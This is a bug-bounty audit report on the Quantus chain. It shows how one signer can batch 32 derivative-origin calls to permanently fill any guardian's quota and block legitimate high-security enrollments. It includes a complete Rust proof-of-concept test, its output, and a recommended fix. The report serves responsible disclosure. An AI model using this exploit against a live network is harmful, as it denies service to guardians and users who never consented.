# 88329 bc medium missing guardian consent in set high security lets one signer permanently exhaust any guardian s quota and block legitimate enrollments

**Submitted on Aug 12th 2026 at 19:09:58 UTC by @ngosytuan for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88329
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Summary

The permissionless **ReversibleTransfers::set\_high\_security** dispatchable lets its caller nominate any account as guardian without a signature, acceptance, or other authorization from that guardian. Every nomination immediately consumes one entry in the target guardian's bounded **GuardianIndex**, whose production capacity is 32 accounts.

A normal account can exploit this in one signed transaction by batching 32 **Utility::as\_derivative** calls. Each derivative supplies a distinct effective signed origin and calls **set\_high\_security** with the same target guardian. The derivative accounts need no keys, balances, reserves, holds, existential deposits, or existing System account records.

After the batch succeeds, the target guardian's index contains 32 attacker-controlled pseudonyms. A legitimate funded account that then selects the same guardian is deterministically rejected with **TooManyGuardianAccounts**. The target guardian cannot repair the poisoned quota: **recover\_funds** only sweeps balances and deliberately preserves both **HighSecurityAccounts** and **GuardianIndex**. The PoC confirms that the entry survives even after the pseudonym is funded, recovered, and reaped from System storage.

**Affected asset:** The Substrate L1 node/runtime\
**Affected commit:** `3b243b870a5442a6e5f443056f67bbba87d472f5`\
**Affected pallet:** `pallets/reversible-transfers`\
**Attacker privileges:** One ordinary funded account; no privileged role or victim interaction\
**Observed attack fee:** `23,260,190,920` planck = `0.023260190920 QNT`

This matches the program's listed Medium impact, “Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol),” in the [Quantus competition scope](https://immunefi.com/audit-competition/audit-comp-quantus/scope/#top).

### Root cause

The guardian reverse index is target-keyed and bounded:

```rust
pub type GuardianIndex<T: Config> = StorageMap<
    _,
    Blake2_128Concat,
    T::AccountId,
    BoundedVec<T::AccountId, T::MaxGuardianAccounts>,
    ValueQuery,
>;
```

Production config sets the hard limit to 32:

```rust
pub const MaxGuardianAccounts: u32 = 32;
```

However, **set\_high\_security** authenticates only the nominating account. It checks that the target is not the caller, but never obtains authorization from the target guardian before consuming its capacity:

```rust
pub fn set_high_security(
    origin: OriginFor<T>,
    delay: BlockNumberOrTimestampOf<T>,
    guardian: T::AccountId,
) -> DispatchResult {
    let who = ensure_signed(origin)?;

    ensure!(guardian != who.clone(), Error::<T>::GuardianCannotBeSelf);
    ensure!(
        !HighSecurityAccounts::<T>::contains_key(&who),
        Error::<T>::AccountAlreadyHighSecurity
    );

    Self::validate_delay(&delay)?;

    let high_security_account_data =
        HighSecurityAccountData { guardian: guardian.clone(), delay };

    GuardianIndex::<T>::try_mutate(guardian.clone(), |accounts| {
        if !accounts.contains(&who) {
            accounts
                .try_push(who.clone())
                .map_err(|_| Error::<T>::TooManyGuardianAccounts)
        } else {
            Ok(())
        }
    })?;

    HighSecurityAccounts::<T>::insert(who.clone(), &high_security_account_data);
    Self::deposit_event(Event::HighSecuritySet { who, guardian, delay });

    Ok(())
}
```

The runtime's Utility pallet amplifies the issue. **as\_derivative** deterministically changes the effective signed origin without requiring the pseudonym to have a key or account balance:

```rust
let who = ensure_signed(origin.clone())?;
let pseudonym = derivative_account_id(who, index);
origin.set_caller_from(frame_system::RawOrigin::Signed(pseudonym));
let result = call.dispatch(origin);
```

Relevant source locations:

* [GuardianIndex definition](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/reversible-transfers/src/lib.rs#L243-L254)
* [Vulnerable set\_high\_security implementation](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/reversible-transfers/src/lib.rs#L376-L405)
* [recover\_funds preserves the relationship](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/reversible-transfers/src/lib.rs#L530-L633)
* [Production MaxGuardianAccounts = 32](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/configs/mod.rs#L524-L550)
* [Utility::as\_derivative origin rewriting](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/utility/src/lib.rs#L289-L310)
* [Deterministic derivative account generation](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/utility/src/lib.rs#L733-L750)

### Exploit sequence

{% stepper %}
{% step %}

## Select a guardian

The attacker selects a live guardian account to deny service to.
{% endstep %}

{% step %}

## Construct a batch

The attacker constructs one **Utility::batch** containing 32 children.
{% endstep %}

{% step %}

## Use derivative calls

Child `i` is **Utility::as\_derivative(index=i, set\_high\_security(target\_guardian))**.
{% endstep %}

{% step %}

## Generate distinct origins

Each child receives a distinct deterministic signed pseudonym.
{% endstep %}

{% step %}

## Enroll zero-balance pseudonyms

Each pseudonym is absent from System storage and has zero free, reserved, and held balance, but **set\_high\_security** accepts it.
{% endstep %}

{% step %}

## Fill the guardian index

All 32 pseudonyms are appended to **GuardianIndex\[target\_guardian]**.
{% endstep %}

{% step %}

## Block a legitimate enrollment

A legitimate funded user calls **set\_high\_security** with that guardian and receives **TooManyGuardianAccounts**.
{% endstep %}

{% step %}

## Preserve the poisoned entries

Funding, recovering, and reaping an attacker pseudonym does not remove either persistent storage row, so the index remains full.
{% endstep %}
{% endstepper %}

This exploit does not depend on controlling multiple P2P identities, validators, miners, or independently funded accounts. The demonstrated attack is one authenticated signer and one valid extrinsic using a runtime-supported dispatch wrapper.

### Impact

An attacker can permanently prevent any chosen account from accepting further legitimate high-security guardian relationships. The target does not sign or interact with the attacker. The target also has no guardian-side reject, deregister, or cleanup operation.

The denial persists across:

* zero-balance/nonexistent pseudonym state;
* later creation of the pseudonym's System account;
* guardian execution of **recover\_funds**;
* balance removal and account reaping.

Restoring the target guardian's capacity therefore requires a runtime migration, direct privileged storage repair, or a code change. The report does not claim theft or freezing of existing user funds; the precise impact is low-cost, persistent denial of the guardian feature and is submitted as Medium griefing.

The full signed-runtime PoC measured:

| Property                           |                   Result |
| ---------------------------------- | -----------------------: |
| Attacker signers                   |                        1 |
| Signed extrinsics                  |                        1 |
| Derivative origins                 |                       32 |
| Derivative balances/reserves/holds |                0 / 0 / 0 |
| Attack call SCALE length           |              1,379 bytes |
| Signed ML-DSA-65 extrinsic length  |              6,681 bytes |
| Declared total weight              | 16,471,033,920 ref\_time |
| Actual fee                         |    23,260,190,920 planck |
| Actual fee in QNT                  |           0.023260190920 |
| Guardian index after attack        |                  32 / 32 |
| Legitimate enrollment              |  TooManyGuardianAccounts |
| Index after recovery and reaping   |                  32 / 32 |

### Expected versus actual behavior

**Expected:** A target guardian should authorize a relationship before it consumes that guardian's bounded capacity, or the guardian should be able to reject an unwanted relationship and release the slot.

**Actual:** Any signed origin can irreversibly consume a slot belonging to any target guardian. One signer can consume all 32 slots in one transaction using zero-balance derivatives, and the target guardian has no cleanup path.

### Public-known-issue differentiation

The published Equilibrium finding **EQ-QNT-REVERSIBLE-F-01** and related PRs discuss owner-side permanence: an account that voluntarily enables high-security mode cannot later rotate its chosen guardian or exit the mode. This report does not treat that accepted permanence as the vulnerability.

The distinct root cause here is that an unconsenting **target guardian** can have its bounded capacity consumed by third parties. Owner-controlled exit would not repair this exploit because the attacker controls all 32 pseudonyms and has no reason to exit. The repair must add guardian-side authorization/rejection or remove the target-keyed hard quota.

I reviewed the relevant public material:

* [PR #556 — Eiger audit reversibles 2](https://github.com/Quantus-Network/chain/pull/556)
* [PR #559 — Eiger pallet final](https://github.com/Quantus-Network/chain/pull/559)
* [PR #647 — V12 audit round 2](https://github.com/Quantus-Network/chain/pull/647)
* [Published Substrate audit](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/audits/quantus-substrate-audit-20260513.pdf)

Those materials discuss owner permanence, genesis index population, self-guardian validation, and guardian-index benchmarking. They do not describe missing guardian consent, arbitrary-target quota exhaustion, or the one-signer derivative attack demonstrated here.

### Recommended remediation

{% stepper %}
{% step %}

## Submit a nomination request

The protected account submits a nomination request.
{% endstep %}

{% step %}

## Accept as guardian

The nominated guardian signs an acceptance.
{% endstep %}

{% step %}

## Insert accepted relationships

Only accepted relationships are inserted into **GuardianIndex** and count toward **MaxGuardianAccounts**.
{% endstep %}
{% endstepper %}

A guardian should also be able to reject pending nominations without consuming quota. If revocation is supported, cleanup must atomically update every related storage structure. Requiring only account existence or a small nominator deposit is not sufficient because one signer can derive and fund many pseudonyms; target authorization is the decisive control.

## Proof of Concept

### What the PoC proves

The following integration test executes the attack through the complete production transaction pipeline:

* builds a real ML-DSA-65 signed extrinsic;
* includes the production **TxExtension** tuple;
* calls **Executive::apply\_extrinsic**;
* uses one outer signer and 32 **as\_derivative** origins;
* verifies every derivative starts and ends with no System account, balance, reserve, or hold;
* verifies both the guardian and legitimate victim are live funded accounts;
* fills the production limit of 32 entries;
* proves the legitimate victim receives **TooManyGuardianAccounts**;
* reads the actual **TransactionFeePaid** event;
* funds one poisoned pseudonym, calls **recover\_funds** as the guardian, reaps it, and proves the poisoned rows remain.

No mainnet, public testnet, external node, or third-party asset is used.

{% stepper %}
{% step %}

## Obtain the exact scoped commit

```bash
git clone https://github.com/immunefi-team/audit-comp-quantus-chain.git
cd audit-comp-quantus-chain
git checkout 3b243b870a5442a6e5f443056f67bbba87d472f5
```

{% endstep %}

{% step %}

## Create the PoC file

Save the complete code below as:

```
runtime/tests/guardian_quota_derivative.rs
```

```rust
//! Isolated full-pipeline PoC for guardian-index exhaustion through Utility derivatives.

use codec::Encode;
use frame_support::{
	assert_ok,
	dispatch::GetDispatchInfo,
	traits::{fungible::InspectHold, Currency},
};
use qp_dilithium_crypto::Dilithium65Pair;
use quantus_runtime::{
	transaction_extensions::{ReversibleTransactionExtension, WormholeProofRecorderExtension},
	Balances, Executive, ReversibleTransfers, Runtime, RuntimeCall, RuntimeEvent, Signature,
	SignedPayload, System, TxExtension, UncheckedExtrinsic, EXISTENTIAL_DEPOSIT, UNIT, VERSION,
};
use sp_core::Pair;
use sp_runtime::{generic::Era, traits::IdentifyAccount, AccountId32, MultiAddress};

fn signed_call(
	pair: &Dilithium65Pair,
	sender: AccountId32,
	call: RuntimeCall,
	nonce: u32,
) -> UncheckedExtrinsic {
	let genesis_hash = System::block_hash(0);
	let tx_ext: TxExtension = (
		frame_system::CheckNonZeroSender::<Runtime>::new(),
		frame_system::CheckSpecVersion::<Runtime>::new(),
		frame_system::CheckTxVersion::<Runtime>::new(),
		frame_system::CheckGenesis::<Runtime>::new(),
		frame_system::CheckEra::<Runtime>::from(Era::immortal()),
		frame_system::CheckNonce::<Runtime>::from(nonce),
		frame_system::CheckWeight::<Runtime>::new(),
		ReversibleTransactionExtension::<Runtime>::new(),
		WormholeProofRecorderExtension::<Runtime>::new(),
		pallet_transaction_payment::ChargeTransactionPayment::<Runtime>::from(0),
		frame_metadata_hash_extension::CheckMetadataHash::<Runtime>::new(false),
		frame_system::WeightReclaim::<Runtime>::new(),
	);
	let raw_payload = SignedPayload::from_raw(
		call.clone(),
		tx_ext.clone(),
		(
			(),
			VERSION.spec_version,
			VERSION.transaction_version,
			genesis_hash,
			genesis_hash,
			(),
			(),
			(),
			(),
			(),
			None,
			(),
		),
	);
	let signature = raw_payload.using_encoded(|payload| pair.sign(payload));
	UncheckedExtrinsic::new_signed(
		call,
		MultiAddress::Id(sender),
		Signature::Dilithium65(signature),
		tx_ext,
	)
}

#[test]
fn one_signature_and_zero_balance_derivatives_exhaust_guardian_quota() {
	use quantus_runtime::BuildStorage;

	let pair = Dilithium65Pair::from_seed_slice(&[42u8; 32]).expect("valid seed");
	let attacker = pair.public().into_account();
	let guardian = AccountId32::new([77u8; 32]);
	let legitimate = AccountId32::new([88u8; 32]);
	let delay = qp_scheduler::BlockNumberOrTimestamp::BlockNumber(2);

	let storage = frame_system::GenesisConfig::<Runtime>::default()
		.build_storage()
		.expect("system genesis builds");
	let mut ext = sp_io::TestExternalities::new(storage);
	ext.execute_with(|| {
		Balances::make_free_balance_be(&attacker, 1000 * UNIT);
		Balances::make_free_balance_be(&guardian, UNIT);
		Balances::make_free_balance_be(&legitimate, UNIT);
		System::set_block_number(1);
		assert!(System::account_exists(&guardian));
		assert!(System::account_exists(&legitimate));

		let derivatives: Vec<AccountId32> = (0..32u16)
			.map(|index| pallet_utility::derivative_account_id(attacker.clone(), index))
			.collect();
		assert!(derivatives.iter().all(|account| account != &guardian));
		println!(
			"pseudonym_before exists={} free={} reserved={} holds={}",
			System::account_exists(&derivatives[0]),
			Balances::free_balance(&derivatives[0]),
			Balances::reserved_balance(&derivatives[0]),
			Balances::total_balance_on_hold(&derivatives[0]),
		);
		println!(
			"live_target_accounts guardian_exists={} victim_exists={}",
			System::account_exists(&guardian),
			System::account_exists(&legitimate),
		);
		for derivative in &derivatives {
			assert_eq!(Balances::free_balance(derivative), 0);
			assert_eq!(Balances::reserved_balance(derivative), 0);
			assert_eq!(Balances::total_balance_on_hold(derivative), 0);
			assert!(!System::account_exists(derivative));
		}

		let calls: Vec<RuntimeCall> = (0..32u16)
			.map(|index| {
				RuntimeCall::Utility(pallet_utility::Call::as_derivative {
					index,
					call: Box::new(RuntimeCall::ReversibleTransfers(
						pallet_reversible_transfers::Call::set_high_security {
							delay,
							guardian: guardian.clone(),
						},
					)),
				})
			})
			.collect();
		let call = RuntimeCall::Utility(pallet_utility::Call::batch { calls });
		let call_len = call.encode().len();
		let call_info = call.get_dispatch_info();
		let xt = signed_call(&pair, attacker.clone(), call, 0);
		let info = xt.get_dispatch_info();
		let xt_len = xt.encode().len() as u32;
		let balance_before = Balances::free_balance(&attacker);

		assert_ok!(Executive::apply_extrinsic(xt).expect("signed extrinsic is valid"));

		let fee_paid = System::events()
			.iter()
			.find_map(|record| match &record.event {
				RuntimeEvent::TransactionPayment(
					pallet_transaction_payment::Event::TransactionFeePaid { who, actual_fee, tip },
				) if who == &attacker => {
					assert_eq!(*tip, 0);
					Some(*actual_fee)
				},
				_ => None,
			})
			.expect("fee event exists");
		assert_eq!(balance_before - Balances::free_balance(&attacker), fee_paid);

		let index = ReversibleTransfers::guardian_index(&guardian);
		assert_eq!(index.len(), 32);
		for derivative in &derivatives {
			assert!(index.contains(derivative));
			let setting = ReversibleTransfers::is_high_security(derivative)
				.expect("every derivative was enrolled");
			assert_eq!(setting.guardian, guardian);
			assert_eq!(setting.delay, delay);
			assert_eq!(Balances::free_balance(derivative), 0);
			assert_eq!(Balances::reserved_balance(derivative), 0);
			assert_eq!(Balances::total_balance_on_hold(derivative), 0);
			assert!(!System::account_exists(derivative));
		}

		let victim_error = ReversibleTransfers::set_high_security(
			quantus_runtime::RuntimeOrigin::signed(legitimate.clone()),
			delay,
			guardian.clone(),
		)
		.unwrap_err();
		assert_eq!(
			victim_error,
			pallet_reversible_transfers::Error::<Runtime>::TooManyGuardianAccounts.into()
		);
		assert!(ReversibleTransfers::is_high_security(&legitimate).is_none());
		assert_eq!(ReversibleTransfers::guardian_index(&guardian).len(), 32);
		println!(
			"pseudonym_after_enrollment exists={} free={} reserved={} holds={} guardian_index={}",
			System::account_exists(&derivatives[0]),
			Balances::free_balance(&derivatives[0]),
			Balances::reserved_balance(&derivatives[0]),
			Balances::total_balance_on_hold(&derivatives[0]),
			ReversibleTransfers::guardian_index(&guardian).len(),
		);

		// Even a later real account lifecycle does not clean either pallet storage row.
		let reaped = derivatives[0].clone();
		Balances::make_free_balance_be(&reaped, 2 * EXISTENTIAL_DEPOSIT);
		assert!(System::account_exists(&reaped));
		assert_ok!(ReversibleTransfers::recover_funds(
			quantus_runtime::RuntimeOrigin::signed(guardian.clone()),
			reaped.clone(),
		));
		assert_eq!(Balances::free_balance(&reaped), 0);
		assert_eq!(Balances::reserved_balance(&reaped), 0);
		assert_eq!(Balances::total_balance_on_hold(&reaped), 0);
		assert!(!System::account_exists(&reaped));
		assert!(ReversibleTransfers::is_high_security(&reaped).is_some());
		assert!(ReversibleTransfers::guardian_index(&guardian).contains(&reaped));
		assert_eq!(ReversibleTransfers::guardian_index(&guardian).len(), 32);
		println!(
			"pseudonym_after_reap exists={} free={} reserved={} holds={} high_security={} guardian_index={}",
			System::account_exists(&reaped),
			Balances::free_balance(&reaped),
			Balances::reserved_balance(&reaped),
			Balances::total_balance_on_hold(&reaped),
			ReversibleTransfers::is_high_security(&reaped).is_some(),
			ReversibleTransfers::guardian_index(&guardian).len(),
		);

		println!("attack_call_encoded_len={call_len}");
		println!("runtime_call_total_weight={:?}", call_info.total_weight());
		println!("signed_extrinsic_encoded_len={xt_len}");
		println!("declared_call_weight={:?}", info.call_weight);
		println!("declared_total_weight={:?}", info.total_weight());
		println!("actual_fee_planck={fee_paid}");
		println!("actual_fee_unit={:.12}", fee_paid as f64 / UNIT as f64);
		println!("victim_error={victim_error:?}");
	});
}
```

{% endstep %}

{% step %}

## Run the PoC

The test was confirmed with Rust `1.93.0`:

```bash
cargo test -p quantus-runtime --test guardian_quota_derivative -- --nocapture
```

{% endstep %}
{% endstepper %}

### Expected output

Compiler warnings unrelated to the finding are omitted. The relevant output is:

```
running 1 test
pseudonym_before exists=false free=0 reserved=0 holds=0
live_target_accounts guardian_exists=true victim_exists=true
pseudonym_after_enrollment exists=false free=0 reserved=0 holds=0 guardian_index=32
pseudonym_after_reap exists=false free=0 reserved=0 holds=0 high_security=true guardian_index=32
attack_call_encoded_len=1379
runtime_call_total_weight=Weight { ref_time: 15958403920, proof_size: 277117 }
signed_extrinsic_encoded_len=6681
declared_call_weight=Weight { ref_time: 15958403920, proof_size: 277117 }
declared_total_weight=Weight { ref_time: 16471033920, proof_size: 285792 }
actual_fee_planck=23260190920
actual_fee_unit=0.023260190920
victim_error=Module(ModuleError { index: 11, error: [13, 0, 0, 0], message: Some("TooManyGuardianAccounts") })
test one_signature_and_zero_balance_derivatives_exhaust_guardian_quota ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
```

The decisive observations are:

1. The target guardian and legitimate victim both exist.
2. All 32 derivative origins remain nonexistent and unfunded.
3. One signed transaction fills the guardian index to 32.
4. The victim receives **TooManyGuardianAccounts**.
5. Recovery and account reaping leave the index at 32 and preserve the high-security row.
6. The complete attack costs `0.023260190920 QNT` at the scoped runtime configuration.
